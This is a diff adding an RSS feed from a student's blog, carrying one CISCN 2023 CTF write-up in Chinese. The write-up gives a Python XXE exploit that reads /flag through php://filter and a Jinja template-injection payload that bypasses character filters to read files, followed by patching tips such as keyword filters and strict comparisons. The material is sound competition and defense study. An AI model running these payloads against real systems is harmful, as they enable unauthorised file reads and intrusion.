@@ -1,0 +1,81 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Cubic Y³ • Posts by &#34;web&#34; tag</title>
+        <link>http://cubicy.icu</link>
+        <description>Notes, CTF, DIY, thoughts and waifus.
+
+I&#39;m CubicYYY, an undergraduate student majoring in Computer Science at Zhejiang University.
+❤❤❤ CTF, toy projects, electric guitar
+✖✖✖ Technological supremacy
+
+Résumé👉 [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/resume&amp;target=resume.tex&amp;command=xelatex).</description>
+        <language>zh-CN</language>
+        <pubDate>Fri, 07 Jul 2023 00:28:12 +0800</pubDate>
+        <lastBuildDate>Fri, 07 Jul 2023 00:28:12 +0800</lastBuildDate>
+        <category>Misc</category>
+        <category>Write-Up</category>
+        <category>出题</category>
+        <category>English</category>
+        <category>CISCN</category>
+        <category>web</category>
+        <category>Hackergame</category>
+        <category>Overclocking</category>
+        <category>SchoolBus</category>
+        <category>Rust</category>
+        <category>Lifetime</category>
+        <category>Code</category>
+        <category>Programming</category>
+        <category>冰菓</category>
+        <category>古籍研究社</category>
+        <category>Treap</category>
+        <category>Stack</category>
+        <category>BST</category>
+        <category>图论</category>
+        <category>Kruskal</category>
+        <category>Splay</category>
+        <category>数链剖分</category>
+        <category>树状数组</category>
+        <category>LCA</category>
+        <category>持久化</category>
+        <category>线段树</category>
+        <category>分块</category>
+        <category>哈希</category>
+        <category>Phar</category>
+        <category>反序列化</category>
+        <category>PHP</category>
+        <category>NLP</category>
+        <category>Fuzzing</category>
+        <category>AFL</category>
+        <category>Miscellaneous</category>
+        <category>On Going</category>
+        <category>Compiler</category>
+        <category>Computer Science</category>
+        <category>Math</category>
+        <category>Translation</category>
+        <category>Yoneda Lemma</category>
+        <item>
+            <guid isPermalink="true">http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/</guid>
+            <title>CISCN 2023 Write-Up &amp; Tricks</title>
+            <link>http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/</link>
+            <category>Write-Up</category>
+            <category>CISCN</category>
+            <category>web</category>
+            <pubDate>Fri, 07 Jul 2023 00:28:12 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;CISCN-2023-部分-Write-Up-及patch妙妙小技巧&#34;&gt;&lt;a href=&#34;#CISCN-2023-部分-Write-Up-及patch妙妙小技巧&#34; class=&#34;headerlink&#34; title=&#34;CISCN 2023 部分 Write-Up 及patch妙妙小技巧&#34;&gt;&lt;/a&gt;CISCN 2023 部分 Write-Up 及patch妙妙小技巧&lt;/h1&gt;&lt;h2 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&#34;ezphp&#34;&gt;&lt;a href=&#34;#ezphp&#34; class=&#34;headerlink&#34; title=&#34;ezphp&#34;&gt;&lt;/a&gt;ezphp&lt;/h3&gt;&lt;p&gt;变量覆盖+XXE外部实体注入任意文件读。&lt;br&gt;Patch：修了extract就行&lt;br&gt;exp:  &lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file = &lt;span class=&#34;string&#34;&gt;&amp;quot;/flag&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;username = &lt;span class=&#34;string&#34;&gt;&amp;quot;okok20&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;y&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;user_xml_format&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE ANY [&amp;lt;!ENTITY content SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=&lt;span class=&#34;subst&#34;&gt;&amp;#123;file&amp;#125;&lt;/span&gt;&amp;quot;&amp;gt;]&amp;gt;&amp;lt;userinfo&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;content;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;1&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;&amp;lt;/userinfo&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://175.20.20.196/register.php&amp;quot;&lt;/span&gt;,data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.get(&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://175.20.20.196/login.php?username=&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;amp;password=2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;Ciscn-Search-Engine&#34;&gt;&lt;a href=&#34;#Ciscn-Search-Engine&#34; class=&#34;headerlink&#34; title=&#34;Ciscn_Search_Engine&#34;&gt;&lt;/a&gt;Ciscn_Search_Engine&lt;/h3&gt;&lt;p&gt;Jinja模板注入，绕过滤字符。我们可以使用request调用get参数来绕过各种字符。   &lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name1=__class__&amp;amp;name2=__base__&amp;amp;name3=__subclasses__&amp;amp;name4=pop&amp;amp;name5=read&amp;amp;name6=&amp;quot;/flag&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Patch：把花括号干了。  &lt;/p&gt;
+&lt;h3 id=&#34;其他七七八八的Patch&#34;&gt;&lt;a href=&#34;#其他七七八八的Patch&#34; class=&#34;headerlink&#34; title=&#34;其他七七八八的Patch&#34;&gt;&lt;/a&gt;其他七七八八的Patch&lt;/h3&gt;&lt;p&gt;首先，我们是可以知道Patch失败的原因的，那么一定要确保不要Patch过猛导致服务异常；我们需要&lt;strong&gt;优先确保服务正常工作，逐步加大Patch力度&lt;/strong&gt;。&lt;/p&gt;
+&lt;h4 id=&#34;过滤关键字&#34;&gt;&lt;a href=&#34;#过滤关键字&#34; class=&#34;headerlink&#34; title=&#34;过滤关键字&#34;&gt;&lt;/a&gt;过滤关键字&lt;/h4&gt;&lt;p&gt;无脑过滤可以迅速打上Patch！我们可以尽量构造一些正常流量中不太可能出现的字符组合来避免被判服务down掉。&lt;br&gt;比如说，想要过滤Python模板注入，我们可以过滤如下组合：&lt;br&gt;&lt;code&gt;|_&lt;/code&gt;, &lt;code&gt;._&lt;/code&gt;, &lt;code&gt;_c&lt;/code&gt;, &lt;code&gt;_[&lt;/code&gt;, &lt;code&gt;](&lt;/code&gt;&lt;br&gt;而对于SQL注入就更简单了：自己打一打，看看哪些函数、符号能利用，就直接过滤掉。  &lt;/p&gt;
+&lt;h4 id=&#34;类型安全&#34;&gt;&lt;a href=&#34;#类型安全&#34; class=&#34;headerlink&#34; title=&#34;类型安全&#34;&gt;&lt;/a&gt;类型安全&lt;/h4&gt;&lt;p&gt;如果涉及弱类型的语言，比如PHP，经常会有洞出在弱比较上，那么我们可以考虑如下几种手段：  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用强比较：例如PHP&amp;#x2F;Js中使用&lt;code&gt;===&lt;/code&gt;而非&lt;code&gt;==&lt;/code&gt;；&lt;/li&gt;
+&lt;li&gt;在关键参数入口处进行正则化：例如，对于期望是整数的参数&lt;code&gt;iv&lt;/code&gt;，就应强制让&lt;code&gt;iv=intval(iv)&lt;/code&gt;转为整型；&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;相信也可以发现国赛这种patch难度远低于attack的难度。建议&lt;strong&gt;做题的初期当作没有攻击得分，先patch了再说&lt;/strong&gt;。&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
